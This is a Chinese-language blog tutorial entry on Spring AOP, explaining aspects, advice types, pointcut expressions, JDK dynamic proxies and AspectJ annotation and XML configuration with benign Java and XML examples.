        <content type="html"><![CDATA[<h3 id="一、Spring-AOP介绍和概念"><a href="#一、Spring-AOP介绍和概念" class="headerlink" title="一、Spring AOP介绍和概念"></a>一、Spring AOP介绍和概念</h3><h4 id="1-AOP"><a href="#1-AOP" class="headerlink" title="1.AOP"></a>1.AOP</h4><p>AOP（Aspect Oriented Programming），即面向切面编程，是OOP的补充，它也提供了模块化。在面向对象编程中，关键的单元是对象，AOP的关键单元是切面，或者说关注点（可以简单地理解为你程序中的独立模块）。一些切面可能有集中的代码，但是有些可能被分散或者混杂在一起，例如日志或者事务。这些分散的切面被称为横切关注点。一个横切关注点是一个可以影响到整个应用的关注点，而且应该被尽量地集中到代码的一个地方，例如事务管理、权限、日志、安全等。</p><p>AOP让你可以使用简单可插拔的配置，在实际逻辑执行之前、之后或周围动态添加横切关注点。这让代码在当下和将来都变得易于维护。如果你是使用XML来使用切面的话，要添加或删除关注点，你不用重新编译完整的源代码，而仅仅需要修改配置文件就可以了。</p><p>总而言之，AOP就是使用不修改源代码的方式，在主干功能里添加或者加强新的功能。</p><h4 id="2、Spring-AOP-中的一些概念"><a href="#2、Spring-AOP-中的一些概念" class="headerlink" title="2、Spring AOP 中的一些概念"></a>2、Spring AOP 中的一些概念</h4><p><strong>切面(Aspect)</strong>：AOP核心就是切面，它将多个类的通用行为封装成可重用的模块，该模块含有一组API提供横切功能。比如，一个日志模块可以被称作日志的AOP切面。根据需求的不同，一个应用程序可以有若干切面。在Spring AOP中，切面通过带有@Aspect注解的类实现。(是动作，把通知应用到切入点过程)</p><p><strong>连接点(Join Point)</strong>：在程序执行过程中的一点，例如方法的执行或异常的处理。在Spring AOP中，连接点始终代表方法的执行。(类中哪些方法可以被增强，这些方法称为连接点)</p><p><strong>通知(Advice)</strong>：AOP在特定的切入点上执行的增强处理，有before, after, afterReturning, afterThrowing, around (实际被增强的部分)</p><p><strong>切入点（Pointcut）</strong>：决定处理如权限校验、日志记录等在何处切入业务代码中（即织入切面）。切点分为execution方式和annotation方式。前者可以用路径表达式指定哪些类织入切面，后者可以指定被哪些注解修饰的代码织入切面。(实际被真正增强的方法)</p><p><strong>引介（Introduction）</strong>：引介让一个切面可以声明被通知的对象实现了任何他们没有真正实现的额外接口，而且为这些对象提供接口的实现使用 @DeclareParaents 注解来生成一个引介。</p><p><strong>目标对象（Target object）</strong>：一个或多个切面通知的对象。也称为通知对象。由于Spring AOP是使用运行时代理实现的，因此该对象将始终是代理对象。</p><p><strong>AOP代理（AOP proxy）</strong>：由AOP框架创建的对象，用于实施Aspect（处理方法执行等）。在Spring Framework中，AOP代理将是JDK动态代理或CGLIB代理。</p><p><strong>织入（Weaving）</strong>：织入，就是通过动态代理，在目标对象方法中执行处理内容的过程。</p><h4 id="3、通知的类型"><a href="#3、通知的类型" class="headerlink" title="3、通知的类型"></a>3、通知的类型</h4><p>通知(advice)是你在你的程序中想要应用在其他模块中的横切关注点的实现。Advice主要有以下5种类型：</p><p><strong>前置通知(Before Advice)</strong>: 在连接点之前执行的Advice，不过除非它抛出异常，否则没有能力中断执行流。使用<br>@Before 注解使用这个Advice。<br><strong>返回之后通知(After Retuning Advice)也称最终通知</strong>:<br>在连接点正常结束之后执行的Advice。例如，如果一个方法没有抛出异常正常返回。通过 @AfterReturning 关注使用它。<br><strong>抛出（异常）后执行通知(After Throwing Advice)也称异常通知</strong>:<br>如果一个方法通过抛出异常来退出的话，这个Advice就会被执行。通过 @AfterThrowing 注解来使用。<br><strong>后置通知(After Advice)</strong>:<br>无论连接点是通过什么方式退出的(正常返回或者抛出异常)都会执行在结束后执行这些Advice。通过 @After 注解使用。<br><strong>围绕通知(Around Advice)也称环绕通知</strong>:<br>围绕连接点执行的Advice，就你一个方法调用。这是最强大的Advice。通过@Around 注解使用。</p><h4 id="4、在Spring-AOP中关注点和横切关注点有什么不同？"><a href="#4、在Spring-AOP中关注点和横切关注点有什么不同？" class="headerlink" title="4、在Spring AOP中关注点和横切关注点有什么不同？"></a>4、在Spring AOP中关注点和横切关注点有什么不同？</h4><p><code>关注点</code>：是我们想在应用的模块中实现的行为。关注点可以被定义为：我们想实现以解决特定业务问题的方法。<br> <code>横切关注点</code>：是贯穿整个应用程序的关注点。像日志、安全和数据转换，它们在应用的每一个模块都是必须的，所以他们是一种横切关注点。</p><h3 id="二、AOP的底层原理"><a href="#二、AOP的底层原理" class="headerlink" title="二、AOP的底层原理"></a>二、AOP的底层原理</h3><h4 id="1-AOP底层使用动态代理"><a href="#1-AOP底层使用动态代理" class="headerlink" title="1.AOP底层使用动态代理"></a>1.AOP底层使用动态代理</h4><p>有两种情况的动态代理</p><p>(1) 有接口情况使用JDK代理</p><p>创建接口实现类代理对象</p><p>(2) 没有接口的情况使用CGLIB动态代理</p><p>创建当前类子类的代理对象</p><h4 id="2-使用-JDK-动态代理"><a href="#2-使用-JDK-动态代理" class="headerlink" title="2.使用 JDK 动态代理"></a>2.使用 JDK 动态代理</h4><p>使用 JDK 动态代理，使用 Proxy 类里面的方法创建代理对象 java.lang.reflect.Proxy</p><p>(1)调用newProxyInstance方法</p><pre class=" language-java"><code class="language-java">start object <span class="token function">newProxyInstance</span><span class="token punctuation">(</span>ClassLoader<span class="token punctuation">,</span>类<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span> interfaces<span class="token punctuation">,</span>InvocationHandler h<span class="token punctuation">)</span></code></pre><p>方法有三个参数：</p><p> 第一参数ClassLoder，类加载器 </p><p>第二参数类&lt;?&gt;[] interfaces，增强方法所在的类，这个类实现的接口，支持多个接口 </p><p>第三参数InvocationHandler，实现这个接口 InvocationHandler，创建代理对象，写增强的部分</p><p>代码演示</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserDao</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 2数相加     */</span>    <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     *     * @param id     */</span>    <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span>String id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">UserDao</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"add方法执行了..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> a<span class="token operator">+</span>b<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span>String id<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"update方法执行了"</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JDKProxy</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 创建接口实现类代理对象</span>        Class<span class="token punctuation">[</span><span class="token punctuation">]</span> interfaces <span class="token operator">=</span> <span class="token punctuation">{</span>UserDao<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*第三个参数传入匿名内部类        Proxy.newProxyInstance(JDKProxy.class.getClassLoader(), interfaces, new InvocationHandler() {            @Override            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {                return null;            }        });*/</span>        UserDaoImpl userDaoImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserDaoImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        UserDao dao <span class="token operator">=</span> <span class="token punctuation">(</span>UserDao<span class="token punctuation">)</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>JDKProxy<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> interfaces<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">UserDaoProxy</span><span class="token punctuation">(</span>userDaoImpl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> sum <span class="token operator">=</span> dao<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"sum = "</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * 创建代理对象 */</span><span class="token keyword">class</span> <span class="token class-name">UserDaoProxy</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> Object obj<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 1、创建的是谁的对象，就把谁传递过来</span>    <span class="token keyword">public</span> <span class="token function">UserDaoProxy</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>obj <span class="token operator">=</span> obj<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 增强的逻辑     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">invoke</span><span class="token punctuation">(</span>Object proxy<span class="token punctuation">,</span> Method method<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Throwable <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 方法之前</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"方法之前执行..."</span> <span class="token operator">+</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":传递的参数"</span> <span class="token operator">+</span> Arrays<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 被增强的方法执行</span>        Object res <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 方法之后</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"方法之后执行"</span> <span class="token operator">+</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="三、Spring-AOP的实现"><a href="#三、Spring-AOP的实现" class="headerlink" title="三、Spring AOP的实现"></a>三、Spring AOP的实现</h3><p>基于Java的主要AOP实现有：<code>AspectJ</code> <code>Spring AOP</code> <code>JBoss AOP</code></p><h4 id="1、准备工作"><a href="#1、准备工作" class="headerlink" title="1、准备工作"></a>1、准备工作</h4><p>（1）Spring 框架一般都是基于 AspectJ 实现 AOP 操作</p><p>AspectJ 不是 Spring 组成部分，独立 AOP 框架，一般把 AspectJ 和 Spirng 框架一起使用，进行 AOP 操作</p><p>（2）基于 AspectJ 实现 AOP 操作</p><pre><code>基于 xml配置文件实现基于注解方式实现（使用）</code></pre><p>（3）工程中，引入Spring AOP相关的依赖</p><p><img src="assets/image-20220220173003058.png" alt="image-20220220173003058"></p><p>（4）切入点表达式（ Point Cut Expression）</p><p><code>切入点表达式作用</code>：知道对哪个类里面的哪个方法进行增强<br> <code>语法结构</code>：</p><pre><code>execution([权限修饰符] [返回类型] [类全路径] [方法名称]([参数列表]) )</code></pre><pre><code>举例 1：对 com.micah.dao.BookDao 类里面的 add 进行增强 execution(* com.atguigu.dao.BookDao.add(..))举例 2：对 com.micah.dao.BookDao 类里面的所有的方法进行增强execution(* com.atguigu.dao.BookDao.* (..))举例 3：对 com.atguigu.dao 包里面所有类，类里面所有方法进行增强execution(* com.micah.dao.*.* (..))</code></pre><p>其它切入类型：</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"execution(public * *(..))"</span><span class="token punctuation">)</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">anyPublicOperation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"within(com.xyz.someapp.trading..*)"</span><span class="token punctuation">)</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">inTrading</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"anyPublicOperation() &amp;&amp; inTrading()"</span><span class="token punctuation">)</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">tradingOperation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre><p><strong>常见切入点表达式的一些示例在下面给出。</strong></p><pre class=" language-java"><code class="language-java">the execution of any <span class="token keyword">public</span> method<span class="token function">execution</span><span class="token punctuation">(</span><span class="token keyword">public</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span>名称以“ set”开头的任何方法的执行：<span class="token function">execution</span><span class="token punctuation">(</span><span class="token operator">*</span> set<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span>AccountService接口定义的任何方法的执行：<span class="token function">execution</span><span class="token punctuation">(</span><span class="token operator">*</span> com<span class="token punctuation">.</span>xyz<span class="token punctuation">.</span>service<span class="token punctuation">.</span>AccountService<span class="token punctuation">.</span>*<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span>the execution of any method defined in the service <span class="token keyword">package</span><span class="token operator">:</span><span class="token function">execution</span><span class="token punctuation">(</span><span class="token operator">*</span> com<span class="token punctuation">.</span>xyz<span class="token punctuation">.</span>service<span class="token punctuation">.</span>*<span class="token punctuation">.</span>*<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span>服务包或子包中定义的任何方法的执行：<span class="token function">execution</span><span class="token punctuation">(</span><span class="token operator">*</span> com<span class="token punctuation">.</span>xyz<span class="token punctuation">.</span>service<span class="token punctuation">.</span><span class="token punctuation">.</span>*<span class="token punctuation">.</span>*<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span>服务包中的任何连接点（仅在Spring AOP中执行方法）：<span class="token function">within</span><span class="token punctuation">(</span>com<span class="token punctuation">.</span>xyz<span class="token punctuation">.</span>service<span class="token punctuation">.</span>*<span class="token punctuation">)</span>服务包或子包中的任何连接点（仅在Spring AOP中执行方法）：<span class="token function">within</span><span class="token punctuation">(</span>com<span class="token punctuation">.</span>xyz<span class="token punctuation">.</span>service<span class="token punctuation">.</span><span class="token punctuation">.</span>*<span class="token punctuation">)</span>代理实现AccountService接口的任何连接点（仅在Spring AOP中是方法执行） ：<span class="token keyword">this</span><span class="token punctuation">(</span>com<span class="token punctuation">.</span>xyz<span class="token punctuation">.</span>service<span class="token punctuation">.</span>AccountService<span class="token punctuation">)</span></code></pre><h4 id="2、AspectJ"><a href="#2、AspectJ" class="headerlink" title="2、AspectJ"></a>2、AspectJ</h4><p>启用@AspectJ支持后，@AspectSpring将自动检测在应用程序上下文中使用@AspectJ方面（具有注释）的类定义的任何bean，并将其用于配置Spring AOP。</p><p>(1) 创建类，在类里面定义方法，添加@Component注解，创建对象</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 前置通知     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"add......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>（2）创建增强类（编写增强逻辑），在增强类里面，创建方法，让不同方法代表不同通知类型</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@Aspect</span>     <span class="token comment" spellcheck="true">// 生成代理对象</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserProxy</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 相同切入点抽取     */</span>    <span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"execution(* com.micah.spring.aopnno.User.add(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">pointCut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 前置通知     * @Before注解表示作为前置通知     * @Order 有多个增强类多同一个方法进行增强，设置增强类优先级，数字越小等级越高     */</span>    <span class="token annotation punctuation">@Order</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Before</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"pointCut()"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"before..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 后置通知（返回通知）     */</span>    <span class="token annotation punctuation">@AfterReturning</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"execution(* com.micah.spring.aopnno.User.add(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterReturning</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"afterReturning..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 异常通知     */</span>    <span class="token annotation punctuation">@AfterThrowing</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"execution(* com.micah.spring.aopnno.User.add(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterThrowing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"afterThrowing..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     *最终通知     */</span>    <span class="token annotation punctuation">@After</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"execution(* com.micah.spring.aopnno.User.add(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">after</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"after..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 环绕通知     */</span>    <span class="token annotation punctuation">@Around</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"execution(* com.micah.spring.aopnno.User.add(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">around</span><span class="token punctuation">(</span>ProceedingJoinPoint proceedingJoinPoint<span class="token punctuation">)</span> <span class="token keyword">throws</span> Throwable <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"环绕之前..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 被增强的方法执行</span>        proceedingJoinPoint<span class="token punctuation">.</span><span class="token function">proceed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"环绕之后..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>aop</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/aop<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd                        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd                        http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 开启注解扫描 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.micah.spring<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">context:</span>component-scan</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 开启Aspect生成代理对象--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>aspectj-autoproxy</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">aop:</span>aspectj-autoproxy</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><pre><code>环绕之前...before...add......环绕之后...after...afterReturning...</code></pre><p>（3）有多个增强类多同一个方法进行增强，设置增强类优先级<br> 在增强类上面添加注解 @Order(数字类型值)，数字类型值越小优先级越高</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@Aspect</span><span class="token annotation punctuation">@Order</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PersonProxy</span> </code></pre><p>（4）完全使用注解开发<br> 创建配置类，不需要创建 xml 配置文件</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span>basePackages <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"com.micah"</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token annotation punctuation">@EnableAspectJAutoProxy</span><span class="token punctuation">(</span>proxyTargetClass <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//开启Aspect生成代理对象</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConfigAop</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> </code></pre><h4 id="3、Aspect配置文件"><a href="#3、Aspect配置文件" class="headerlink" title="3、Aspect配置文件"></a>3、Aspect配置文件</h4><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--创建对象--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>book<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.spring5.aopxml.Book<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bookProxy<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.spring5.aopxml.BookProxy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--配置 aop 增强--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>config</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--切入点--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>pointcut</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>p<span class="token punctuation">"</span></span> <span class="token attr-name">expression</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>execution(*com.micah.spring.aopxml.Book.buy(..))<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token comment" spellcheck="true">&lt;!--配置切面--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>aspect</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bookProxy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--增强作用在具体的方法上--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>before</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>before<span class="token punctuation">"</span></span> <span class="token attr-name">pointcut-ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>p<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">aop:</span>aspect</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">aop:</span>config</span><span class="token punctuation">></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    
